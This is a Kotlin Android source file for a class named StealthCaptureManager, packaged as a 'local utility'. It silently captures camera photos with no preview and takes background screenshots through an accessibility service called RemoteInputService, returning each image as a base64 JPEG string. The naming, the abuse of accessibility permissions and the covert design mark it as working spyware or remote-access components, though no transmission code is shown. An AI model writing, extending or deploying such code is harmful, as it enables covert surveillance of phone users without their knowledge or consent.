
package com.example.localutility

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.Bitmap
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.util.Base64
import android.util.Log
import android.util.Size
import android.view.Display
import java.io.ByteArrayOutputStream
import java.nio.ByteBuffer
import java.util.concurrent.atomic.AtomicBoolean

class StealthCaptureManager(private val context: Context) {

    private val mainHandler = Handler(Looper.getMainLooper())

    companion object {
        private const val TAG = "StealthCapture"
        private val isBusy = AtomicBoolean(false)
        private const val CAPTURE_TIMEOUT_MS = 7000L
        private const val HARDWARE_COOLDOWN_MS = 1500L
        private const val JPEG_COMPRESSION_QUALITY = 65
    }

    /**
     * Captures a silent photo entirely in RAM.
     * Selects supported resolution dynamically and uses TEMPLATE_PREVIEW repeating stream
     * on a dedicated background HandlerThread so camera HAL AE/AF warm-up succeeds without deadlock.
     */
    @SuppressLint("MissingPermission")
    fun captureCamera(isFront: Boolean, onComplete: (base64Jpeg: String?, error: String?) -> Unit) {
        if (!isBusy.compareAndSet(false, true)) {
            onComplete(null, "Camera hardware is busy. Please wait a moment.")
            return
        }

        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as? CameraManager
        if (cameraManager == null) {
            isBusy.set(false)
            onComplete(null, "Camera service unavailable")
            return
        }

        // Dedicated background HandlerThread for Camera2 HAL callbacks
        val cameraThread = HandlerThread("StealthCameraThread").apply { start() }
        val cameraHandler = Handler(cameraThread.looper)

        var isFinished = false
        var cameraDevice: CameraDevice? = null
        var captureSession: CameraCaptureSession? = null
        var imageReader: ImageReader? = null

        fun finishWith(data: String?, err: String?) {
            if (isFinished) return
            isFinished = true
            try { captureSession?.stopRepeating() } catch (_: Exception) {}
            try { captureSession?.close() } catch (_: Exception) {}
            try { imageReader?.close() } catch (_: Exception) {}
            try { cameraDevice?.close() } catch (_: Exception) {}
            try { cameraThread.quitSafely() } catch (_: Exception) {}
            mainHandler.postDelayed({ isBusy.set(false) }, HARDWARE_COOLDOWN_MS)
            mainHandler.post { onComplete(data, err) }
        }

        // 7-second safety timeout so camera is never left open
        cameraHandler.postDelayed({
            finishWith(null, "Camera capture timed out")
        }, CAPTURE_TIMEOUT_MS)

        try {
            val targetFacing = if (isFront) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
            val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
                val chars = cameraManager.getCameraCharacteristics(id)
                chars.get(CameraCharacteristics.LENS_FACING) == targetFacing
            } ?: cameraManager.cameraIdList.firstOrNull()

            if (cameraId == null) {
                finishWith(null, "No camera found on device")
                return
            }

            // Pick a supported resolution close to 1280x720 / 960x720 / 640x480
            val characteristics = cameraManager.getCameraCharacteristics(cameraId)
            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val supportedSizes = map?.getOutputSizes(ImageFormat.JPEG) ?: emptyArray()

            val targetSize = supportedSizes.filter { it.width <= 1280 && it.height <= 960 }
                .maxByOrNull { it.width * it.height }
                ?: supportedSizes.minByOrNull { it.width * it.height }
                ?: Size(640, 480)

            Log.d(TAG, "Selected camera output resolution: ${targetSize.width}x${targetSize.height} for ${if (isFront) "FRONT" else "BACK"}")

            val reader = ImageReader.newInstance(targetSize.width, targetSize.height, ImageFormat.JPEG, 2)
            imageReader = reader

            var framesAcquired = 0

            reader.setOnImageAvailableListener({ r ->
                try {
                    val image = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                    framesAcquired++

                    // Skip frame 0 so auto-exposure has a few milliseconds to warm up; capture frame 2
                    if (framesAcquired < 2) {
                        image.close()
                        return@setOnImageAvailableListener
                    }

                    val planes = image.planes
                    if (planes.isNotEmpty()) {
                        val buffer = planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                        image.close()
                        Log.d(TAG, "Successfully captured silent camera frame (${bytes.size} bytes)")
                        finishWith(base64, null)
                        return@setOnImageAvailableListener
                    }
                    image.close()
                } catch (e: Exception) {
                    Log.e(TAG, "Image read error", e)
                    finishWith(null, e.message)
                }
            }, cameraHandler)

            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    try {
                        val surface = reader.surface
                        @Suppress("DEPRECATION")
                        camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                captureSession = session
                                try {
                                    val requestBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                                        addTarget(surface)
                                        set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                                        set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                        set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                        set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
                                    }
                                    session.setRepeatingRequest(requestBuilder.build(), null, cameraHandler)
                                    Log.d(TAG, "Silent capture repeating stream started on camera HAL")
                                } catch (e: Exception) {
                                    Log.e(TAG, "Capture repeating request failed", e)
                                    finishWith(null, "Capture failed: ${e.message}")
                                }
                            }

                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                finishWith(null, "Camera session configure failed")
                            }
                        }, cameraHandler)
                    } catch (e: Exception) {
                        Log.e(TAG, "Session creation error", e)
                        finishWith(null, "Session error: ${e.message}")
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    finishWith(null, "Camera disconnected")
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    finishWith(null, "Camera open error: $error")
                }
            }, cameraHandler)

        } catch (e: Exception) {
            Log.e(TAG, "Camera open exception", e)
            finishWith(null, "Camera error: ${e.message}")
        }
    }

    /**
     * Captures a silent system screenshot using AccessibilityService in RAM.
     * Safely copies GraphicBuffer to software bitmap BEFORE closing buffer to avoid native crash.
     */
    fun captureScreenshot(onComplete: (base64Jpeg: String?, error: String?) -> Unit) {
        val service = RemoteInputService.instance
        if (service == null) {
            onComplete(null, "Accessibility Service must be toggled ON in phone settings")
            return
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!isBusy.compareAndSet(false, true)) {
                onComplete(null, "System capture is busy, please wait a moment")
                return
            }

            var isDone = false
            fun finishScreenshot(data: String?, err: String?) {
                if (isDone) return
                isDone = true
                mainHandler.postDelayed({ isBusy.set(false) }, 1000)
                mainHandler.post { onComplete(data, err) }
            }

            // 6-second timeout for screenshot
            mainHandler.postDelayed({
                finishScreenshot(null, "Screenshot timed out")
            }, 6000)

            try {
                service.takeScreenshot(
                    Display.DEFAULT_DISPLAY,
                    context.mainExecutor,
                    object : android.accessibilityservice.AccessibilityService.TakeScreenshotCallback {
                        override fun onSuccess(screenshotResult: android.accessibilityservice.AccessibilityService.ScreenshotResult) {
                            try {
                                val buffer = screenshotResult.hardwareBuffer
                                val colorSpace = screenshotResult.colorSpace
                                val hwBitmap = Bitmap.wrapHardwareBuffer(buffer, colorSpace)

                                if (hwBitmap != null) {
                                    // CRITICAL: Copy to software ARGB_8888 bitmap BEFORE buffer.close()!
                                    val softwareBitmap = hwBitmap.copy(Bitmap.Config.ARGB_8888, false)
                                    buffer.close()
                                    hwBitmap.recycle()

                                    if (softwareBitmap != null) {
                                        val stream = ByteArrayOutputStream()
                                        softwareBitmap.compress(Bitmap.CompressFormat.JPEG, JPEG_COMPRESSION_QUALITY, stream)
                                        softwareBitmap.recycle()

                                        val base64 = Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)
                                        finishScreenshot(base64, null)
                                    } else {
                                        finishScreenshot(null, "Failed to copy hardware bitmap to software memory")
                                    }
                                } else {
                                    buffer.close()
                                    finishScreenshot(null, "Failed to wrap hardware buffer")
                                }
                            } catch (e: Exception) {
                                Log.e(TAG, "Screenshot decode error", e)
                                finishScreenshot(null, "Screenshot decode error: ${e.message}")
                            }
                        }

                        override fun onFailure(errorCode: Int) {
                            Log.e(TAG, "Screenshot capture failed code: $errorCode")
                            finishScreenshot(null, "Screenshot failed (code: $errorCode). Ensure Accessibility is enabled.")
                        }
                    }
                )
            } catch (e: Exception) {
                Log.e(TAG, "Screenshot exception", e)
                finishScreenshot(null, "Screenshot exception: ${e.message}")
            }
        } else {
            onComplete(null, "Background silent screenshot requires Android 11 or higher")
        }
    }
}


